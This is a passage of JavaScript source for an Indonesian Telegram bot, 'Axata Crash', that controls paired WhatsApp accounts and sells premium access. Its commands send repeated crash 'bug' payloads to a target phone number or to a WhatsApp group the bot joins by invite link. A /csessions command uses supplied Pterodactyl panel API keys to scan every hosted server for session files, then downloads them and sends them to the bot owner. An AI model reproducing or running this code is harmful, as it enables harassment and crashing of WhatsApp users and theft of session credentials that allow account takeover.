 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 50; i++) {
            await DelayAndro(target);
            await sleep(6000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/DelayAxta (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 20; i++) {
            await DelayAxta(target);
            await sleep(6000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS GROUP ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/Killgroup(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "Ga ada sender wle😛");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Kamu Bukan User Premium");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Link Kamu Salah\nContoh: /Killgroup https://chat.whatsapp.com/xxxx");
    }

    const groupLink = match[1].trim();
    if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
        return bot.sendMessage(chatId, "❌ Link kamu Salah\nContoh: /Killgroup https://chat.whatsapp.com/xxxx");
    }

    const groupCode = groupLink.split("https://chat.whatsapp.com/")[1];

    try {
        await bot.sendMessage(chatId, "⏳ Sedang bergabung ke grup, mohon tunggu...");

        const groupInfo = await sock.groupAcceptInvite(groupCode);
        const groupId = groupInfo.id;

        await bot.sendMessage(chatId, "✅ Berhasil join grup! Sedang mengirim bug...");

        // Kirim bug ke dalam grup setelah join
        await AxataGroup(groupId);

        await bot.sendMessage(
            chatId,
            `Tᴀʀɢᴇᴛ Gʀᴏᴜᴘ: ${groupId}\n` +
            `Cᴏᴍᴍᴀɴᴅ : /invisgroup\n` +
            `Wᴀʀɴɪɴɢ : jeda 5 menit\n`
        );
    } catch (err) {
        console.error("Error saat join atau kirim bug:", err);
        return bot.sendMessage(chatId, "❌ Gagal mengirim bug ke grup. Mungkin bot ditolak masuk atau link salah.");
    }
});
/// --------- ( Plungi ) --------- \\\


/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( END CASE BUGS ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\



/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE SET JEDA) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
    const chatId = msg.chat.id;
    const response = setCooldown(match[1]);

    bot.sendMessage(chatId, response);
});

/// --- ( case add bot ) --- \\\
bot.onText(/\/reqpair (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
        return bot.sendMessage(
            chatId,
            `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`, {
                parse_mode: "markdown"
            }
        );
    }
    const botNumber = match[1].replace(/[^0-9]/g, "");

    try {
        await connectToWhatsApp(botNumber, chatId);
    } catch (error) {
        console.error("Error in reqpair:", error);
        bot.sendMessage(
            chatId,
            "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
        );
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE LIST PAIRING ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

function saveActiveSessions(botNumber) {
    try {
        const set = new Set()
        if (fs.existsSync(SESSIONS_FILE)) {
            const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8"))
            for (const n of Array.isArray(existing) ? existing : [])
                if (n) set.add(String(n))
        }
        set.add(String(botNumber))
        const tmp = SESSIONS_FILE + ".tmp"
        fs.writeFileSync(tmp, JSON.stringify([...set]))
        fs.renameSync(tmp, SESSIONS_FILE)
    } catch {}
}
bot.onText(/\/listconnect/, async (msg) => {
    const chatId = msg.chat.id;
    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
        return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*", {
            parse_mode: "Markdown"
        });
    }

    try {
        if (sessions.size === 0) {
            return bot.sendMessage(chatId, "📭 Tidak ada koneksi aktif.");
        }

        const sessionArray = Array.from(sessions.keys());
        const pageSize = 5; // jumlah per halaman
        const totalPages = Math.ceil(sessionArray.length / pageSize);

        const generatePage = (page = 1) => {
            const start = (page - 1) * pageSize;
            const end = start + pageSize;
            const currentSessions = sessionArray.slice(start, end);

            let text = "```\n⟬ DEVICE STATUS ⟭\n";
            text += `✦ Total       : ${sessionArray.length} device(s)\n`;
            text += `✦ Connected   : ${sessionArray.length} device(s)\n`;
            text += `✦ Disconnected: 0 device(s)\n`;
            text += "⟬───────────────⟭\n\n";
            text += `⟬ DEVICE LIST (${page}/${totalPages}) ⟭\n`;

            let index = start + 1;
            for (const number of currentSessions) {
                text += `🟢 device${index}\n   └ ${number}\n`;
                index++;
            }

            text += "```";

            const inline_keyboard = [];
            if (totalPages > 1) {
                const row = [];
                if (page > 1) row.push({
                    text: "⬅️ Back",
                    callback_data: `list_back_${page - 1}`
                });
                if (page < totalPages) row.push({
                    text: "Next ➡️",
                    callback_data: `list_next_${page + 1}`
                });
                inline_keyboard.push(row);
            }

            return {
                text,
                reply_markup: {
                    inline_keyboard
                }
            };
        };

        const {
            text,
            reply_markup
        } = generatePage(1);
        bot.sendMessage(chatId, text, {
            parse_mode: "Markdown",
            reply_markup
        });
    } catch {
        bot.sendMessage(chatId, "Terjadi kesalahan saat mengambil daftar koneksi.");
    }
});

bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data.startsWith("list_next_") || data.startsWith("list_back_")) {
        const page = parseInt(data.split("_")[2]);
        const sessionArray = Array.from(sessions.keys());
        const pageSize = 5;
        const totalPages = Math.ceil(sessionArray.length / pageSize);

        const start = (page - 1) * pageSize;
        const end = start + pageSize;
        const currentSessions = sessionArray.slice(start, end);

        let text = "```\n⟬ DEVICE STATUS ⟭\n";
        text += `✦ Total       : ${sessionArray.length} device(s)\n`;
        text += `✦ Connected   : ${sessionArray.length} device(s)\n`;
        text += `✦ Disconnected: 0 device(s)\n`;
        text += "⟬───────────────⟭\n\n";
        text += `⟬ DEVICE LIST (${page}/${totalPages}) ⟭\n`;

        let index = start + 1;
        for (const number of currentSessions) {
            text += `🟢 device${index}\n   └ ${number}\n`;
            index++;
        }

        text += "```";

        const inline_keyboard = [];
        if (totalPages > 1) {
            const row = [];
            if (page > 1) row.push({
                text: "⬅️ Back",
                callback_data: `list_back_${page - 1}`
            });
            if (page < totalPages) row.push({
                text: "Next ➡️",
                callback_data: `list_next_${page + 1}`
            });
            inline_keyboard.push(row);
        }

        bot.editMessageText(text, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard
            },
        });
        bot.answerCallbackQuery(query.id);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE ADDPREM ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

/// --- ( case add acces premium ) --- \\\
bot.onText(/\/Xaddprem(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, ` 
╭───────────────⪼
│⚠️ LU SIAPA BODO ⚠️
╰───────────────⪼
╭────────────⪼
│No Acces
╰────────────⪼`);
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, ` 
╭───────────────⪼
│Wrong command ( Idiot )
╰───────────────⪼
╭────────────⪼
│/Xaddprem ID 30d.
╰────────────⪼.`);
    }

    const args = match[1].split(' ');
    if (args.length < 2) {
        return bot.sendMessage(chatId, ` 
╭───────────────⪼
│Wrong command ( Idiot )
╰───────────────⪼
╭────────────⪼
│/Xaddprem ID 30d.
╰────────────⪼.`);
    }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];

    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, ` 
╭───────────────⪼
│Wrong command ( Idiot )
╰───────────────⪼
╭────────────⪼
│/Xaddprem ID 30d.
╰────────────⪼.`);
    }

    if (!/^\d+[dhm]$/.test(duration)) {
        return bot.sendMessage(chatId, ` 
╭───────────────⪼
│Wrong command ( Idiot )
╰───────────────⪼
╭────────────⪼
│/Xaddprem ID 30d.
╰────────────⪼.`);
    }

    const now = moment();
    const expirationDate = moment().add(
        parseInt(duration),
        duration.slice(-1) === 'd' ?
        'days' :
        duration.slice(-1) === 'h' ?
        'hours' :
        'minutes'
    );

    if (!premiumUsers.find(user => user.id === userId)) {
        premiumUsers.push({
            id: userId,
            expiresAt: expirationDate.toISOString()
        });
        savePremiumUsers();
        console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
        bot.sendMessage(chatId, ` 
╭────(SUKSES ADDPREM)─────⪼
│USER ID : ${userId}
│ADD TYPE : PREMIUM
│EXPIRED : ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
╰────────────⪼.`);
    } else {
        const existingUser = premiumUsers.find(user => user.id === userId);
        existingUser.expiresAt = expirationDate.toISOString();
        savePremiumUsers();
        bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
    }
});




/// --- ( case list acces premium ) --- \\\
bot.onText(/\/listprem/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
    }

    if (premiumUsers.length === 0) {
        return bot.sendMessage(chatId, "📌 No premium users found.");
    }

    let message = "```";
    message += "\n";
    message += " ( + )  LIST PREMIUM USERS\n";
    message += "\n";
    premiumUsers.forEach((user, index) => {
        const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
        message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
    });
    message += "\n```";

    bot.sendMessage(chatId, message, {
        parse_mode: "Markdown"
    });
});



/// --- ( case add acces admin ) --- \\\
bot.onText(/\/Xaddadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);

        {
            parse_mode: "Markdown"
        }

    }

    if (!match || !match[1])
        return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, /Xaddadmin 58273654 30d`);

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, /Xaddadmin 58273654 30d`);
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `
✅Berhasil menambahkan admin, kini user ${userId} Memiliki aksess admin. `);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});




/// --- ( case delete acces premium ) --- \\\
bot.onText(/\/Xdelprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, `
❌ Command salah! Contoh /Xdelprem 584726249 30d.`);
    }
    const userId = parseInt(match[1]);
    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di dalam list premium.`);
    }
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium. `);
});




/// --- ( case delete acces admin ) \\\
bot.onText(/\/Xdeladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,

            {
                parse_mode: "Markdown"
            }
        );
    }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /Xdeladmin 5843967527 30d.`);
    }
    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /Xdeladmin 5843967527 30d.`);
    }
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} Belum memiliki aksess admin.`);
    }
});




/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( Case Colong Sender ) ━━━ \\
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ---------- ( Case Colong Sender ) ----------- \\
bot.onText(/^\/csessions(?:\s+([\s\S]+))?/i, async (msg) => {
    try {
        const chatId = msg.chat && msg.chat.id;
        const fromId = msg.from && msg.from.id;

        const text = (msg.text || "").split(" ").slice(1).join(" ");
        if (!text) return bot.sendMessage(chatId, "🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

        const args = text.split(",");
        const domain = args[0];
        const plta = args[1];
        const pltc = args[2];
        if (!plta || !pltc)
            return bot.sendMessage(chatId, "🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

        await bot.sendMessage(chatId, "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json", {
            parse_mode: "Markdown"
        });

        const base = String(domain || "").replace(/\/+$/, "");
        const commonHeadersApp = {
            Accept: "application/json, application/vnd.pterodactyl.v1+json",
            Authorization: `Bearer ${plta}`,
        };
        const commonHeadersClient = {
            Accept: "application/json, application/vnd.pterodactyl.v1+json",
            Authorization: `Bearer ${pltc}`,
        };

        function isDirectory(item) {
            if (!item || !item.attributes) return false;
            const a = item.attributes;
            if (typeof a.is_file === "boolean") return a.is_file === false;
            return (
                a.type === "dir" ||
                a.type === "directory" ||
                a.mode === "dir" ||
                a.mode === "directory" ||
                a.mode === "d" ||
                a.is_directory === true ||
                a.isDir === true
            );
        }

        async function listAllServers() {
            const out = [];
            let page = 1;
            while (true) {
                const r = await axios
                    .get(`${base}/api/application/servers`, {
                        params: {
                            page
                        },
                        headers: commonHeadersApp,
                        timeout: 15000,
                    })
                    .catch(() => ({
                        data: null
                    }));
                const chunk = r && r.data && Array.isArray(r.data.data) ? r.data.data : [];
                out.push(...chunk);
                const hasNext = !!(r &&
                    r.data &&
                    r.data.meta &&
                    r.data.meta.pagination &&
                    r.data.meta.pagination.links &&
                    r.data.meta.pagination.links.next);
                if (!hasNext || chunk.length === 0) break;
                page++;
            }
            return out;
        }

        async function traverseAndFind(identifier, dir = "/") {
            try {
                const listRes = await axios
                    .get(`${base}/api/client/servers/${identifier}/files/list`, {
                        params: {
                            directory: dir
                        },
                        headers: commonHeadersClient,
                        timeout: 15000,
                    })
                    .catch(() => ({
                        data: null
                    }));
                const listJson = listRes.data;
                if (!listJson || !Array.isArray(listJson.data)) return [];
                let found = [];

                for (let item of listJson.data) {
                    const name = (item?.attributes?.name || item?.name || "").toString();
                    const itemPath = (dir === "/" ? "" : dir) + "/" + name;
                    const normalized = itemPath.replace(/\/+/g, "/");
                    const lower = name.toLowerCase();

                    if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
                        try {
                            const sessRes = await axios
                                .get(`${base}/api/client/servers/${identifier}/files/list`, {
                                    params: {
                                        directory: normalized
                                    },
                                    headers: commonHeadersClient,
                                    timeout: 15000,
                                })
                                .catch(() => ({
                                    data: null
                                }));
                            const sessJson = sessRes.data;
                            if (sessJson && Array.isArray(sessJson.data)) {
                                for (let sf of sessJson.data) {
                                    const sfName = (sf?.attributes?.name || sf?.name || "").toString();
                                    const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                                    if (sfName.toLowerCase() === "sension, sensions") {
                                        found.push({
                                            path: sfPath.replace(/\/+/g, "/"),
                                            name: sfName,
                                        });
                                    }
                                }
                            }
                        } catch (_) {}
                    }

                    if (isDirectory(item)) {
                        try {
                            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
                            if (more.length) found = found.concat(more);
                        } catch (_) {}
                    } else {
                        if (name.toLowerCase() === "sension, sensions") {
                            found.push({
                                path: (dir === "/" ? "" : dir) + "/" + name,
                                name
                            });
                        }
                    }
                }
                return found;
            } catch (_) {
                return [];
            }
        }

        const servers = await listAllServers();
        if (!servers.length) {
            return bot.sendMessage(chatId, "❌ ☇ Tidak ada server yang bisa discan");
        }

        let totalFound = 0;

        for (let srv of servers) {
            const identifier =
                (srv?.attributes?.identifier) || srv?.identifier || (srv?.attributes?.id);
            const name =
                (srv?.attributes?.name) || srv?.name || identifier || "unknown";
            if (!identifier) continue;

            const list = await traverseAndFind(identifier, "/");
            if (list && list.length) {
                for (let fileInfo of list) {
                    totalFound++;
                    const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/, "");

                    await bot.sendMessage(chatId, `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`, {
                        parse_mode: "Markdown"
                    });

                    try {
                        const downloadRes = await axios.get(
                            `${base}/api/client/servers/${identifier}/files/download`, {
                                params: {
                                    file: filePath
                                },
                                headers: commonHeadersClient,
                                timeout: 15000,
                            }
                        ).catch(() => ({
                            data: null
                        }));

                        const dlJson = downloadRes && downloadRes.data;
                        if (dlJson && dlJson.attributes && dlJson.attributes.url) {
                            const url = dlJson.attributes.url;
                            const fileRes = await axios.get(url, {
                                responseType: "arraybuffer",
                                timeout: 20000,
                            }).catch(() => ({
                                data: null
                            }));
                            if (!fileRes || !fileRes.data) continue;
                            const buffer = Buffer.from(fileRes.data);
                            // node-telegram-bot-api: sendDocument(chatId, document, options)
                            await bot.sendDocument(ownerID, buffer, {}, {
                                filename: `${String(name).replace(/\s+/g, "_")}_sensions`
                            });
                        } else {
                            await bot.sendMessage(chatId, `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`);
                        }
                    } catch (e) {
                        console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
                        await bot.sendMessage(chatId, `❌ ☇ Error saat download file creds.json dari ${name}`);
                    }
                }
            }
        }

        if (totalFound === 0) {
            return bot.sendMessage(chatId, "✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
        } else {
            return bot.sendMessage(chatId, `✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
        }
    } catch (err) {
        console.error(err);
        return bot.sendMessage(msg.chat && msg.chat.id, "❌ ☇ Terjadi error saat scan");
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE SET JEDA ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/setjeda (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const param = match[1];

    const hasil = setCooldown(param);
    bot.sendMessage(chatId, hasil);
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE CLEAR BUGS ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/^\/fixedbug(?:\s+([\s\S]+))?/i, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match ? match[1] : null; // Ambil argumen setelah /fixedbug

    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
        return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }

    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }

    let target = pepec + '@s.whatsapp.net';

    try {
        for (let i = 0; i < 3; i++) {
            if (typeof axata !== 'undefined' && axata.sendMessage) {
                await axata.sendMessage(target, {
                    text: "AXATA CLEAR BUG \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAXATA CLEAR BUG"
                });
            }
        }
        bot.sendMessage(chatId, "Done Clear Bug By Axata!!!");
    } catch (err) {
        // Jangan munculkan error apapun
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE FIX CODE ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

const FIX_API = "https://api.nekolabs.my.id/ai/gpt/5"
const MAX_API = 1900

const toParams = (o) => new URLSearchParams(Object.entries(o).filter(([, v]) => v !== undefined && v !== null)).toString()
const extractFences = (t = "") => {
